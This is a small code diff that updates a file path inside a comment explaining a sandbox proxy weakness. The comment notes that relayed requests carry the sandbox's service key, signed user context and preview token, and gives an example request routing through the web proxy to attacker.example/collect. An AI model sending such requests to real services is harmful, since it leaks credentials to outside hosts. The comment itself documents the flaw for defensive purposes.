@@ -5,7 +5,7 @@
  * inbound header except six hop-by-hop ones, and apps/api authenticates each
  * request it relays here — an ordinary user's included — with the sandbox's own
  * service key, plus a signed user-context and the provider's preview token
- * (buildSandboxUpstreamHeaders, apps/api/src/services/sandbox-proxy/backend.ts). So
+ * (buildSandboxUpstreamHeaders, apps/api/src/sandbox-proxy/backend.ts). So
  *
  *     GET /v1/p/<id>/8000/web-proxy/https/attacker.example/collect
  *
